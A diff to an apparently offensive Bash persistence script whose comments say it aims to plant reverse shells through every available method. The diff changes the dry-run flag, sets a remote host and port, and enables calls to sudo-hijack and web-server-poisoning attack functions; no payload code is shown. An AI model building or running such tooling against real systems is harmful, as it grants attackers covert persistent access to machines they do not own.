@@ -6,7 +6,7 @@
 # The script will enumerate all methods available and for each, enumerate all doors
 # The goal is to eventually make it to where it will install a reverse shell everywhere it can for each method, with an option to do a dry run and not install anything, just enumerate everything
 
-DRYRUN=0 # All persistence will install if = to 0
+DRYRUN=1 # All persistence will install if = to 0
 RHOST=0.0.0.0
 RPORT=5253
 CRON="* * * * *"
@@ -149,7 +149,7 @@ webserver_poison_attack () {
 
 main (){
 	enum_methods
-	#sudo_hijack_attack $PASSWDFILE
+	sudo_hijack_attack $PASSWDFILE
 	webserver_poison_attack
 }
 
